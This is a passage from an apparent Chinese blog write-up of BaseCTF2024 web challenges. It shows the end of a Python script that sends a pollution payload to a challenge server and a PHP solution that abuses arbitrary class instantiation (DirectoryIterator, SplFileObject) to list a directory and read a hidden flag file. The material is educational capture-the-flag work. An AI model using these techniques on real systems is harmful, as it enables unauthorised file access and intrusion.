路由</span></span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&quot;http://gz.imxbt.cn:20516/pollute&quot;</span>,</span><br><span class="line">    data=json_payload,</span><br><span class="line">    headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">url2 = <span class="string">&quot;http://gz.imxbt.cn:20516/read&quot;</span></span><br><span class="line">response2 = requests.get(url2)</span><br><span class="line"><span class="built_in">print</span>(response2.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731827989087-3670d240-f849-4a17-87a8-696d008722a0.png" referrerpolicy="no-referrer"></p><h2 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h2><h3 id="考点：-17"><a href="#考点：-17" class="headerlink" title="考点："></a>考点：</h3><p><strong>PHP 的 DirectoryIterator 类：</strong><a href="about:blank"><strong>参考文章</strong></a></p><p><strong>即通过这个迭代器类来获取目录下的文件信息</strong></p><p>** PHP 的 SplFileObject类 ：**<a href="about:blank"><strong>参考文章</strong></a></p><p><strong>用法：SplFileObject（文件路径）</strong></p><h3 id="题解：-17"><a href="#题解：-17" class="headerlink" title="题解："></a>题解：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$J1ng</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line"><span class="variable">$Hong</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line"><span class="variable">$Keng</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"><span class="variable">$Wang</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="variable">$Keng</span>(<span class="variable">$Wang</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="variable">$f</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$J1ng</span>(<span class="variable">$Hong</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>K、W是通过POST方式请求并且是通过类的方式创建了一个对象dir<br>K：可以通过查询php文档找遍历的类。选择<strong>DirectoryIterator</strong><br>W:一般就先访问根目录 传入 ”&#x2F;secret“</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731829419721-25808622-9a21-42b7-8a97-b448e2073f2b.png" referrerpolicy="no-referrer"></p><p>接下来就是读取文件内容</p><p>J 写入**SplFileObject **类，H 写入文件路径</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731830029394-5796494e-5f7b-488d-8bbb-5dc336ac118f.png" referrerpolicy="no-referrer"></p><p>之后我们没发现 flag，应该是在注释里</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/49936693/1731830075345-0c83cdbc-ce27-4d45-b708-3193e4cf4a86.png" referrerpolicy="no-referrer"></p><p>结束</p></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dre4m1nd.github.io">Dre4m1nd</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dre4m1nd.github.io/2024/11/17/BaseCTF2024-web/">http://dre4m1nd.github.io/2024/11/17/BaseCTF2024-web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://dre4m1nd.github.io" target="_blank">Dre4m1nd</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/BaseCTF2024/">BaseCTF2024</a></div><div class="post-share"><div class="social-share" data-image="/img/Dre4m1nd.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" title="sql注入基础学习"><div class="cover" style="background:var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">sql注入基础学习</div></div><div class="info-2"><div class="info-item-1">一 、sqli-labs 本地靶场安装1.phpstudy 安装phpstudy 官网：官网链接 下载 之后解压安装 2 下载 sqli-labs 源码sqli-labs：github 地址 下载好之后解压到 phpstudy 根目录下的 WWW目录下 并将 sqli-labs-master 文件夹重命名为 sqli-labs，如下图 3.修改配置文件**进入 sqlilabs&#x2F;sql-connections 目录下，记事本或其他编辑器打开db-creds.inc 文件，修改为：$dbpass&#x3D;’root’。 之后更换低版本的 php，5.x 都可以 之后更换到低版本 php 之后重启，就可以了。网址http://127.0.0.1/sqli-labs/ 二、了解 SQLSQL 的定义参考文章 **SQL（Structured Query Language）是“结构化查询语言”，它是对关系型数据库的操作语言。它可以应用到所有关系型数据库中。 ** SQL 语法要求 SQL...</div></div></div></a><a class="pagination-related" href="/2024/11/04/%E5%9F%BA%E4%BA%8EHexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="基于Hexo和Github搭建个人博客"><div class="cover" style="background:var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">基于Hexo和Github搭建个人博客</div></div><div class="info-2"><div class="info-item-1">参考文章：https://blog.csdn.net/yaorongke/article/details/119089190 一、准备工作1. GitHub账号需要有一个GitHub账号，没有的话到 官网 申请一个。注册很简单，不懂的话可以参考 GitHub申请账号 2. 安装Git在自己电脑上安装好Git，hexo部署到GitHub时要用。网上找篇教程或者参考 Git安装(Windows) 3. 安装NodeJS在自己电脑上安装好NodeJS，Hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具。网上找篇教程或者参考 NodeJS安装及配置(Windows) 二、创建仓库进入github主页，创建仓库 填写仓库名，格式必须为&lt;用户名&gt;.github.io，然后点击Create Repository 点击creating a new file创建一个新文件，作为我们网站的主页。 新文件的名字必须为index.html，内容先随便写一个简单的，内容示例如下，填写之后点击Commit...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/Dre4m1nd.jpg" onerror='this.onerror=null,this.src="/img/friend_404.gif"' alt="avatar"></div><div class="author-info-name">Dre4m1nd</div><div class="author-info-description">Dre4m1nd的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Dre4m1nd"><i class="fab fa-github"></i><span>进入github主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Dre4m1nd" target="_blank" title="Github"><i class="fab fa-github" style="color:#24292e"></i></a><a class="social-icon" href="mailto:2976587697@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color:#4a7dbe"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">web小白</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#week1"><span class="toc-number">1.</span> <span class="toc-text">week1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%96%B5%E5%96%B5%E5%96%B5%C2%B4%E2%80%A2%EF%BB%8C%E2%80%A2"><span class="toc-number">1.1.</span> <span class="toc-text">喵喵喵´•ﻌ•&#96;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A"><span class="toc-number">1.1.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5%E7%BB%95%E8%BF%87%E6%AC%B8"><span class="toc-number">1.2.</span> <span class="toc-text">md5绕过欸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E6%98%AF%E4%BB%80%E4%B9%88%E5%91%80"><span class="toc-number">1.3.</span> <span class="toc-text">HTTP 是什么呀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#A-Dark-Room"><span class="toc-number">1.4.</span> <span class="toc-text">A Dark Room</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#upload"><span class="toc-number">1.5.</span> <span class="toc-text">upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Aura-%E9%85%B1%E7%9A%84%E7%A4%BC%E7%89%A9"><span class="toc-number">1.6.</span> <span class="toc-text">Aura 酱的礼物</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">题解：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week2"><span class="toc-number">2.</span> <span class="toc-text">week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-ser"><span class="toc-number">2.1.</span> <span class="toc-text">ez_ser</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-6"><span class="toc-number">2.1.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-6"><span class="toc-number">2.1.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%B5%B7%E5%90%83%E8%B1%86%E8%B1%86"><span class="toc-number">2.2.</span> <span class="toc-text">一起吃豆豆</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-7"><span class="toc-number">2.2.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-7"><span class="toc-number">2.2.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%A0%E5%90%AC%E4%B8%8D%E5%88%B0%E6%88%91%E7%9A%84%E5%A3%B0%E9%9F%B3"><span class="toc-number">2.3.</span> <span class="toc-text">你听不到我的声音</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-8"><span class="toc-number">2.3.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-8"><span class="toc-number">2.3.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCEisamazingwithspace"><span class="toc-number">2.4.</span> <span class="toc-text">RCEisamazingwithspace</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-9"><span class="toc-number">2.4.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-9"><span class="toc-number">2.4.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E4%BD%A0%E8%AF%B4%E4%BD%A0%E6%87%82-MD5"><span class="toc-number">2.5.</span> <span class="toc-text">所以你说你懂 MD5?</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-10"><span class="toc-number">2.5.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-10"><span class="toc-number">2.5.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%A6%E5%A4%A7%E5%B8%88"><span class="toc-number">2.6.</span> <span class="toc-text">数学大师</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-11"><span class="toc-number">2.6.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-11"><span class="toc-number">2.6.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Really-EZ-POP"><span class="toc-number">2.7.</span> <span class="toc-text">Really EZ POP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-12"><span class="toc-number">2.7.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-12"><span class="toc-number">2.7.2.</span> <span class="toc-text">题解：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week3"><span class="toc-number">3.</span> <span class="toc-text">week3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A4%E4%B8%AA%E4%B8%8D%E5%81%9C"><span class="toc-number">3.1.</span> <span class="toc-text">滤个不停</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-13"><span class="toc-number">3.1.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-13"><span class="toc-number">3.1.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%A9%E5%8E%9F%E7%A5%9E%E7%8E%A9%E7%9A%84"><span class="toc-number">3.2.</span> <span class="toc-text">玩原神玩的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-14"><span class="toc-number">3.2.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-14"><span class="toc-number">3.2.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-php-jail"><span class="toc-number">3.3.</span> <span class="toc-text">ez_php_jail</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-15"><span class="toc-number">3.3.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-15"><span class="toc-number">3.3.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="toc-number">3.4.</span> <span class="toc-text">复读机</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">3.4.1.</span> <span class="toc-text">考点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">3.4.2.</span> <span class="toc-text">题解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#week4"><span class="toc-number">4.</span> <span class="toc-text">week4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A3%E9%92%A5%E4%B9%8B%E6%88%981-0"><span class="toc-number">4.1.</span> <span class="toc-text">圣钥之战1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-16"><span class="toc-number">4.1.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-16"><span class="toc-number">4.1.2.</span> <span class="toc-text">题解：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E4%B8%8D%E5%B0%B1%E8%A1%8C%E4%BA%86%EF%BC%9F"><span class="toc-number">4.2.</span> <span class="toc-text">flag直接读取不就行了？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A-17"><span class="toc-number">4.2.1.</span> <span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3%EF%BC%9A-17"><span class="toc-number">4.2.2.</span> <span class="toc-text">题解：</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/24/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" title="sql注入基础学习">sql注入基础学习</a><time datetime="2024-11-23T16:03:26.000Z" title="发表于 2024-11-24 00:03:26">2024-11-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/17/BaseCTF2024-web/" title="BaseCTF2024-web">BaseCTF2024-web</a><time datetime="2024-11-17T08:07:51.000Z" title="发表于 2024-11-17 16:07:51">2024-11-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/04/%E5%9F%BA%E4%BA%8EHexo%E5%92%8CGithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/" title="基于Hexo和Github搭建个人博客">基于Hexo和Github搭建个人博客</a><time datetime="2024-11-04T10:07:28.000Z" title="发表于 2024-11-04 18:07:28">2024-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/01/hello-world/" title="Hello World">Hello World</a><time datetime="2024-10-31T16:29:48.469Z" title="发表于 2024-11-01 00:29:48">2024-11-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2024 By Dre4m1nd</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="/js/imgloaded.js?1"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>